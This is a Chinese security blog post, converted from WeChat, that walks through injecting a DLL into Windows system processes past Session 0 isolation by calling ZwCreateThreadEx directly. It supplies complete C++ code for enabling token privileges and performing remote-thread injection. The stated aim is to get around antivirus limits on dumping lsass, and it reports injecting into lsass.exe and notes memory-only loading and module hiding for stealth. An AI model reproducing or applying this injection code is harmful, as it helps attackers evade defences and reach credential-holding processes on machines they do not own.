> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/NYZ5KdDvtJrNAh5oYnkc7A)

**前言**

其实今天写这个的主要原因就是看到倾旋大佬有篇文章提到: 有些反病毒引擎限制从 lsass 中 dump 出缓存, 可以通过注入 lsass, 就想试试注入 lsass

```
看大佬的博客真的可以学到很多东西
```

**编译环境**

```
Win10 VS2019
```

**什么是 session 0**

在 Windows XP，Windows Server 2003 以及更早的版本中，第一个登录的用户以及 Windows 的所有服务都运行在 Session 0 上。  
这样做危险的地方是，用户使用的应用程序可能会利用 Windows 的服务程序提升自己的权限。

后续版本的 windows, 普通应用程序已经不再 session 0 中运行

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8YLoVAu0zB1UX4LicX6mJ6N2YuZwpZkxuONGuo6Ewr0HqiaKE6tddtvBqe9tAOUD5q897VreQ6TeVA/640?wx_fmt=png)

**思路**

由于 SESSION 0 隔离机制，导致传统远程线程注入系统服务进程失败。和传统的 CreateRemoteThread 函数实现的远线程注入 DLL 的唯一一个区别就是, 我们调用的是更为底层的 ZwCreateThreadEx 来创建线程,

虽然 CreateRemoteThread 函数到底层也是调用 ZwCreateThreadEx, 但在调用 ZwCreateThreadEx 时 ,ZwCreateThreadEx 的第 7 个参数 CreateSuspended（CreateThreadFlags）的值始终为 1, 它会导致线程创建完成后一直挂起无法恢复运行, 于是我们选择直接调用 ZwCreateThreadEx, 将第 7 个参数直接置为 0, 这样可达到注入目的

**实现过程**

**先创建一个 dll**

```
BOOL APIENTRY DllMain(HMODULE hModule,
DWORD  ul_reason_for_call,
LPVOID lpReserved
)
{
switch (ul_reason_for_call)
{
case DLL_PROCESS_ATTACH:
{
MessageBox(NULL, L"远程线程注入成功！", L"提示", NULL);
break;
}
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DETACH:
break;
}
return TRUE;
}
```

这里有一个坑: 如果要注入系统进程的话, 创建的 dll 一定要是 64 位的, 这与当前的操作系统有关, 后面编译 exe 的时候也一定要是 64 位的, 这个更当前 exe 多少位有关

这是我的操作系统版本

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8YLoVAu0zB1UX4LicX6mJ6NZMxRA4bedtiaIYmWldksqvRhyVQr4ZeJXug2f3kyG0Oib84gOVOeNTcw/640?wx_fmt=png)

**编写程序**

提升当前进程的权限

```
 BOOL EnbalePrivileges(HANDLE hProcess, LPCWSTR pszPrivilegesName)
 {
     HANDLE hToken = NULL;
     LUID luidValue = { 0 };
     TOKEN_PRIVILEGES tokenPrivileges = { 0 };
     BOOL bRet = FALSE;
     DWORD dwRet = 0;
     // 打开进程令牌并获取进程令牌句柄
     bRet = ::OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &hToken);
     if (FALSE == bRet)
     {
         printf("OpenProcessToken");
         return FALSE;
     }
     // 获取本地系统的 pszPrivilegesName 特权的LUID值
     bRet = ::LookupPrivilegeValue(NULL, pszPrivilegesName, &luidValue);
     if (FALSE == bRet)
     {
           printf("LookupPrivilegeValue");
         return FALSE;
     }
     // 设置提升权限信息
     tokenPrivileges.PrivilegeCount = 1;
     tokenPrivileges.Privileges[0].Luid = luidValue;
     tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
     // 提升进程令牌访问权限
     bRet = ::AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, 0, NULL, NULL);
     if (FALSE == bRet)
     {
         printf("AdjustTokenPrivileges");
         return FALSE;
     }
     else
     {
         // 根据错误码判断是否特权都设置成功
         dwRet = ::GetLastError();
         if (ERROR_SUCCESS == dwRet)
         {
             return TRUE;
         }
         else if (ERROR_NOT_ALL_ASSIGNED == dwRet)
         {
             printf("ERROR_NOT_ALL_ASSIGNED");
             return FALSE;
         }
     }
     return FALSE;
 }
```

这里参考了 https://www.write-bug.com/article/2012.html 

这个师傅对函数中三个 API 都有介绍

**ZwCreateThreadEx**

ZwCreateThreadEx 在 ntdll.dll 中并没有声明，所以我们需要使用 GetProcAddress 从 ntdll.dll 中获取该函数的导出地址。

在 64 位和 32 位中, 函数定义还不一样

64 位中

```
DWORD WINAPI ZwCreateThreadEx(
         PHANDLE ThreadHandle,
         ACCESS_MASK DesiredAccess,
         LPVOID ObjectAttributes,
         HANDLE ProcessHandle,
         LPTHREAD_START_ROUTINE lpStartAddress,
         LPVOID lpParameter,
         ULONG CreateThreadFlags,
         SIZE_T ZeroBits,
         SIZE_T StackSize,
         SIZE_T MaximumStackSize,
         LPVOID pUnkown);
```

32 位中  

```
DWORD WINAPI ZwCreateThreadEx(
         PHANDLE ThreadHandle,
         ACCESS_MASK DesiredAccess,
         LPVOID ObjectAttributes,
         HANDLE ProcessHandle,
         LPTHREAD_START_ROUTINE lpStartAddress,
         LPVOID lpParameter,
         BOOL CreateSuspended,
         DWORD dwStackSize,
         DWORD dw1,
         DWORD dw2,
         LPVOID pUnkown);
```

大体思路更之前 dll 注入差不多, 知识更改 CreateRemoteThread 为 ZwCreateThreadEx

**核心代码**

```
 DWORD _InjectSysThread(DWORD _Pid, LPCWSTR psDllFillName)
 {
     //打开进程
     HANDLE hprocess;
     HANDLE hThread;
     DWORD _SIZE = 0;
     LPVOID pAlloc = NULL;
     DWORD psDllAddr = 0;
     FARPROC pThreadFunction;
     DWORD ZwRet = 0;
     hprocess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, _Pid);
     //在注入进程中写入Loadlibrary名称
     _SIZE = (_tcslen(psDllFillName) + 1) * sizeof(TCHAR);
     pAlloc = ::VirtualAllocEx(hprocess, NULL, _SIZE, MEM_COMMIT, PAGE_READWRITE);
     if (pAlloc == NULL)
     {
         printf("VirtualAllocExERROR");
         return FALSE;
     }
     BOOL x = ::WriteProcessMemory(hprocess, pAlloc, psDllFillName, _SIZE, NULL);
     if (FALSE == x)
     {
         printf("WriteProcessMemoryERROR");
         return FALSE;
     }

     HMODULE hNtdll = LoadLibrary(L"ntdll.dll");
     if (hNtdll == NULL)
     {
         printf("LoadLibraryERROR");
         return FALSE;
     }

     pThreadFunction = ::GetProcAddress(::GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");

 #ifdef _WIN64
     typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
         PHANDLE ThreadHandle,
         ACCESS_MASK DesiredAccess,
         LPVOID ObjectAttributes,
         HANDLE ProcessHandle,
         LPTHREAD_START_ROUTINE lpStartAddress,
         LPVOID lpParameter,
         ULONG CreateThreadFlags,
         SIZE_T ZeroBits,
         SIZE_T StackSize,
         SIZE_T MaximumStackSize,
         LPVOID pUnkown
         );
 #else
     typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
         PHANDLE ThreadHandle,
         ACCESS_MASK DesiredAccess,
         LPVOID ObjectAttributes,
         HANDLE ProcessHandle,
         LPTHREAD_START_ROUTINE lpStartAddress,
         LPVOID lpParameter,
         BOOL CreateSuspended,
         DWORD dwStackSize,
         DWORD dw1,
         DWORD dw2,
         LPVOID pUnkown
         );
 #endif
     typedef_ZwCreateThreadEx ZwCreateThreadEx = NULL;
     ZwCreateThreadEx = (typedef_ZwCreateThreadEx)::GetProcAddress(hNtdll, "ZwCreateThreadEx");

     if (ZwCreateThreadEx == NULL)
     {
         printf("ZwCreateThreadExERROR");
         return FALSE;
     }
     HANDLE hRemoteThread;
     ZwRet = ZwCreateThreadEx(&hRemoteThread, PROCESS_ALL_ACCESS, NULL, hprocess,
         (LPTHREAD_START_ROUTINE)pThreadFunction, pAlloc, 0, 0, 0, 0, NULL);

     if (NULL == hRemoteThread)
     {
         printf("创建线程失败");
         CloseHandle(hprocess);
         return FALSE;
     }
     WaitForSingleObject(hRemoteThread, -1);
     VirtualFreeEx(hprocess, pAlloc, 0, MEM_RELEASE);
     CloseHandle(hRemoteThread);
     CloseHandle(hprocess);
     FreeLibrary(hNtdll);
     return TRUE;
 }
```

**执行结果**

这里我选择的是 explorer.exe

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8YLoVAu0zB1UX4LicX6mJ6NyRcftsB4UaiaNssUFibwUHgiaNibILS7H6PeWzgbyFMum5vk0ibxvofwwdw/640?wx_fmt=png)

注入 lsass.exe , 只不过注入这类程序不会弹窗，但我们不需要弹窗嘛（滑稽）

**![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8YLoVAu0zB1UX4LicX6mJ6NGL2h0vlZ4ibWXUfqfg18aQrx066iaUce8JUCPdcCiaBCQq6h8yD5utsbQ/640?wx_fmt=png)**

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8YLoVAu0zB1UX4LicX6mJ6NnefAdLkooowLsoSjgRB2ffeOdCVdnVRDR5DF8JuHVdcqfXj16WvNvQ/640?wx_fmt=png)

记得使用 Procexp 的时候管理员运行，要不然系统进程模块看不到

但是像这种进程 csrss.exe

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8YLoVAu0zB1UX4LicX6mJ6N7YUSrykLibM24ahPtM0rpez2gxm0NbPUgoXv0YicI76XNUNCdLwbtTFg/640?wx_fmt=png)

遍历不出来, 我看到网上有个师傅说这个进程好像需要更高的权限去访问, 注入的话也需要其他操作, 应该是牵扯到 0 环层面了, 小弟对 0 环内核层并不熟悉, 就写到这里, 基本目标还是达成了

其实还可以内存写入, 隐藏模块，更加隐蔽

如果提权运行报错的话, 记得以管理员身份运行就好了

**参考**

```
https://www.write-bug.com/article/2013.html
https://idiotc4t.com/code-and-dll-process-injection/bypass-session-0-injection
```

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)

**推荐阅读：**

[![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibHHibNbEpsAMia19jkGuuz9tTIfiauo7fjdWicOTGhPibiat3Kt90m1icJc9VoX8KbdFsB6plzmBCTjGDibQ/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247495879&idx=1&sn=ab05215b31822bee4461255e9fac3237&chksm=ec1ca5f8db6b2cee91b02eb6a70e5ed979c6e46ef40b548f8467affed9bc9de476854bc5a41a&scene=21#wechat_redirect)

**点赞，转发，在看**

原创投稿作者：Buffer

![](https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif)